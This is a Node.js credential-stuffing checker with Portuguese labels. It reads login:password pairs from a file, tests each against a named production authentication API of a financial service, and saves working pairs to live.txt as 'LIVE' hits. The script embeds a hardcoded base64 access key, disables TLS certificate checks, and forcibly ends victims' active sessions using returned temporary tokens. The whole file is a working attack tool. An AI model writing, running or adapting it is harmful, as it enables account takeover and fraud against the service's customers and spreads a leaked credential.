const axios = require("axios");
const fs = require("fs");
const https = require("https");

const agent = new https.Agent({ rejectUnauthorized: false });

const VERMELHO = '\x1b[31m';
const VERDE = '\x1b[32m';
const AMARELO = '\x1b[33m';
const RESET = '\x1b[0m';

async function httpRequest(url, method = "GET", payload = null, headers = {}) {
  try {
    const res = await axios({
      url,
      method,
      headers,
      data: payload ? JSON.stringify(payload) : null,
      httpsAgent: agent,
      validateStatus: () => true,
      timeout: 15000
    });
    return res.data;
  } catch (e) {
    return { erro: e.message };
  }
}

async function getPublicIP() {
  try {
    const ip = await httpRequest("https://api.ipify.org");
    return ip || "0.0.0.0";
  } catch {
    return "0.0.0.0";
  }
}

async function testarLogin(login, senha) {
  const ip = await getPublicIP();
  
  const credenciais = {
    login: login,
    password: senha,
    productId: "84",
    accessKey: "YXRlbmFAcm9vdDphdGVuYUBCUTJhSiM2VEIyaWI=",
    ip: ip
  };

  let auth = await httpRequest(
    "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net/credicorp/api/user/authenticate",
    "POST",
    credenciais,
    { "Content-Type": "application/json" }
  );

  if (auth.details?.[0]?.detailedMessage === "UserHasSessionActive") {
    const href = auth.details[0].action?.href;
    const tk = auth.details[0].action?.temporaryToken;
    if (href && tk) {
      await httpRequest(
        `https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net/credicorp/api${href}`,
        "POST",
        null,
        { Authorization: `Bearer ${tk}` }
      );
      auth = await httpRequest(
        "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net/credicorp/api/user/authenticate",
        "POST",
        credenciais,
        { "Content-Type": "application/json" }
      );
    }
  }

  const token = auth.idToken;
  
  if (token && token.length > 0) {
    return { valido: true, token: token };
  }
  
  return { valido: false };
}

async function processarLista() {
  if (!fs.existsSync('lista.txt')) {
    console.log(`${VERMELHO}[ERRO] Arquivo lista.txt não encontrado!${RESET}`);
    console.log(`${AMARELO}[INFO] Crie um arquivo lista.txt com logins no formato: login:senha${RESET}`);
    return;
  }

  const conteudo = fs.readFileSync('lista.txt', 'utf8');
  const linhas = conteudo.split('\n').filter(linha => linha.trim());

  if (linhas.length === 0) {
    console.log(`${VERMELHO}[ERRO] Arquivo lista.txt está vazio!${RESET}`);
    return;
  }

  console.log(`${AMARELO}[INFO] Total de logins para testar: ${linhas.length}${RESET}\n`);

  let aprovados = 0;
  let reprovados = 0;

  for (let i = 0; i < linhas.length; i++) {
    const linha = linhas[i].trim();
    const separador = linha.includes(':') ? ':' : '|';
    const partes = linha.split(separador);

    if (partes.length < 2) {
      console.log(`${VERMELHO}[INVÁLIDO] Formato incorreto: ${linha}${RESET}`);
      reprovados++;
      continue;
    }

    const login = partes[0].trim();
    const senha = partes[1].trim();

    process.stdout.write(`${AMARELO}[${i + 1}/${linhas.length}] Testando: ${login}:${'*'.repeat(senha.length)} ... ${RESET}`);

    const resultado = await testarLogin(login, senha);

    if (resultado.valido) {
      console.log(`${VERDE}✓ LIVE!${RESET}`);
      fs.appendFileSync('live.txt', `${login}:${senha}\n`);
      aprovados++;
    } else {
      console.log(`${VERMELHO}✗ DIE${RESET}`);
      reprovados++;
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  console.log(`\n${VERDE}[LIVE] Aprovados: ${aprovados}${RESET}`);
  console.log(`${VERMELHO}[DIE] Reprovados: ${reprovados}${RESET}`);
  console.log(`${AMARELO}[TOTAL] Testados: ${linhas.length}${RESET}`);
}

processarLista().catch(err => {
  console.log(`${VERMELHO}[ERRO] ${err.message}${RESET}`);
});

